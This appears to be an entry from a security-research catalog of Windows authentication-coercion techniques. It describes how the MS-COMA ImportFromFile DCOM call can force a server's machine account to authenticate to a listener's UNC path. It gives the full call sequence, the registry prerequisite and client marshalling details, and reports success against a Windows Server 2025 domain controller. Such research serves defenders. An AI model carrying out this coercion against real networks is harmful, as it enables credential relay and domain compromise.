# MS-COMA - Remote call to ImportFromFile (opnum 3)

## Summary

+ **Protocol**: [[MS-COMA]: Component Object Model Plus (COM+) Remote Administration Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c5b1ef02-e8f6-4195-9efe-9667928d1bdd)

+ **Interface**: `IImport` / `IImport2` (COMA catalog), reached by **DCOM activation** — there is no fixed named pipe; the object is activated via DCOM and reached on its dynamic `ncacn_ip_tcp` endpoint.

+ **Function name**: [`ImportFromFile`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c81e49b8-6ffa-4872-a3ad-ef423fd58bdc)

+ **Function operation number**: `3`

+ **Authenticated**: Yes (COM+ / catalog administrative access)

## Description

`ImportFromFile` imports COM+ conglomerations from an installer package file. Both of its path
parameters are, per the specification, **UNC paths**, and the server opens the installer-package
file to read it — so pointing `pwszInstallerPackage` at a listener coerces the server (machine
account) to authenticate to it. This is the rare case where the specification states the UNC
expectation outright.

Per [MS-COMA] 3.1.4.x (parameter definitions and processing):

> **pwszModuleDestination**: Either a path in UNC to a directory that is to be used as the installation target location for modules and other files, or NULL...
>
> **pwszInstallerPackage**: A path in UNC to a file that the server will recognize as an installer package file.
>
> - The server SHOULD verify that *pwszInstallerPackage* is a path in UNC, and fail the call if not.
> - The server then MUST verify that the file located by the path exists and is accessible ... and fail the call if not.

The "verify that the file ... exists and is accessible" step is the outbound access that produces
the coercion.

### Conditions — a DCOM chain is required (not a single call)

`ImportFromFile` is **not** reachable as a bare RPC call on a named pipe. It is a DCOM method on the
COMA catalog's `IImport` interface, so a working invocation requires:

1. **DCOM activation** of the COMA catalog server object (via `IRemoteSCMActivator` / OXID
   resolution) to obtain an interface pointer.
2. **Catalog version negotiation** — the server verifies that catalog version negotiation has been
   performed (see [MS-COMA] 3.1.1.5) and **fails the call if not**. So a prior negotiation call is
   mandatory before `ImportFromFile`.
3. Then the `ImportFromFile` call itself, with `pwszInstallerPackage = \\<listener>\share\pkg`.

+ **Privilege**: COM+ administrative access to the catalog (typically local Administrators).
+ **Coerced parameter**: `pwszInstallerPackage` (WCHAR*, UNC); optionally `pwszModuleDestination`.

## Function technical detail

```cpp
HRESULT ImportFromFile(
   [in, string, unique] WCHAR* pwszModuleDestination,
   [in, string] WCHAR* pwszInstallerPackage,
   [in, string, unique] WCHAR* pwszUser,
   [in, string, unique] WCHAR* pwszPassword,
   [in, string, unique] WCHAR* pwszRemoteServerName,
   [in] DWORD dwFlags,
   [in] GUID* reserved1,
   [in] DWORD reserved2,
   [out] DWORD* pcModules,
   [out, size_is(,*pcModules)] DWORD** ppModuleFlags,
   [out, string, size_is(,*pcModules)] LPWSTR** ppModules,
   [out] DWORD* pcComponents,
   [out, size_is(,*pcComponents)] GUID** ppResultCLSIDs,
   [out, string, size_is(,*pcComponents)] LPWSTR** ppResultNames,
   [out, size_is(,*pcComponents)] DWORD** ppResultFlags,
   [out, size_is(,*pcComponents)] LONG** ppResultHRs
 );
```

+ **pwszInstallerPackage**: WCHAR* UNC path to the installer package. The server verifies it is UNC and that the file exists/is accessible (the coercing access).
+ **pwszModuleDestination**: WCHAR* UNC directory (optional; NULL lets the server choose).
+ **dwFlags**: `fIMPORT_OVERWRITE` (0x1), `fIMPORT_WITHUSERS` (0x10).

## Testing status — CONFIRMED (with a required server-side prerequisite)

**Confirmed coercion on Windows Server 2025** (domain controller), 2026-09-12, once the prerequisite
below was met. Full DCOM chain via `.private/coma-import-dcom-client.py` (impacket `DCOMConnection`):

```
CoCreateInstanceEx(CLSID_COMAServer {182C40F0-32E4-11D0-818B-00A0C9231C29}, IID_ICatalogSession {182C40FA-...})
ICatalogSession::InitializeSession(flVerLower=4.0, flVerUpper=5.0)   [opnum 7]  -> negotiated 5.0
QueryInterface -> IID_IImport {C2BE6970-DF9E-11D1-8B87-00C04FD7A924}   (same object)
IImport::ImportFromFile(pwszInstallerPackage="\\<listener>\share\pkg.msi", ...)   [opnum 3]  -> S_OK
  -> listener: Incoming connection; TMP-W-2025-DC1$ authenticated successfully
```

### PREREQUISITE (this is the key finding)

The COMA catalog server is **disabled for remote activation by default** — activation returns
`CO_E_CLASS_DISABLED (0x80004027)` until the registry value

```
HKLM\SOFTWARE\Microsoft\COM3\RemoteAccessEnabled = 1   (REG_DWORD)
```

is set. Notably, **installing the "COM+ Network Access" feature does NOT set this value** (that
feature installs binaries/firewall rules only); `RemoteAccessEnabled` is the actual "Enable remote
access" toggle from Component Services (My Computer -> Properties). Setting it to `1` takes effect
**live** (no reboot needed) and the catalog server immediately becomes remotely activatable.
`Com+Enabled=1` and `HKLM\SOFTWARE\Microsoft\Ole\EnableDCOM=Y` are also required but are the
defaults. Requires COM+/catalog administrative access (local Administrators). Coercion needs no
writable share on the listener — the server authenticates while verifying the installer-package
file exists.

### Client marshalling notes

- The catalog-version negotiation (`ICatalogSession::InitializeSession`, opnum 7) is mandatory
  before `ImportFromFile`, and must be performed on the **same** activated object (obtain `IImport`
  via `QueryInterface`, not a fresh activation — a fresh `CoCreateInstanceEx(CLSID, IID_IImport)` is
  rejected with `reason_not_specified`).
- Each DCOM method call must carry the interface's **IPID** as the ORPC object id
  (`interface.request(req, iid, interface.get_iPid())`); omitting it makes the server return
  `RPC_E_DISCONNECTED`.
- `flVerLower`/`flVerUpper` are IEEE-754 `float`s (send 4.0 and 5.0).

## References

+ Documentation of protocol [MS-COMA]: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c5b1ef02-e8f6-4195-9efe-9667928d1bdd

+ Documentation of function `ImportFromFile` (opnum 3): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c81e49b8-6ffa-4872-a3ad-ef423fd58bdc
